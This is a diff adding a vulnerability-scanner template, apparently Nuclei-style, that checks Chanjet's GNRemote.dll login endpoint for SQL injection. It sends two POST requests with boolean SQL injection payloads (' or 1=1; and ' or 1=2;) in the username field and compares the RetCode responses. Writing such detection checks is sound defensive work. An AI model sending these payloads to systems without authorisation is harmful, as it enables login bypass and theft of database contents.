@@ -1,0 +1,48 @@
+id: chanjet-gnremote-sqli
+brief:
+    title: Changjietong Remote Communication GNRemote.dll - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: Chanjetong has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.
+    label:
+        - yonyou
+        - chanjet
+        - sqli
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+      body: username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+      signs:
+        - "on": word
+          has:
+            - '{"RetCode":0}'
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{"RetCode":2}'
+          in: body_2
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+      body: username=%22'%20or%201%3d2%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+      signs:
+        - "on": word
+          has:
+            - '{"RetCode":0}'
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{"RetCode":2}'
+          in: body_2
+          need: all
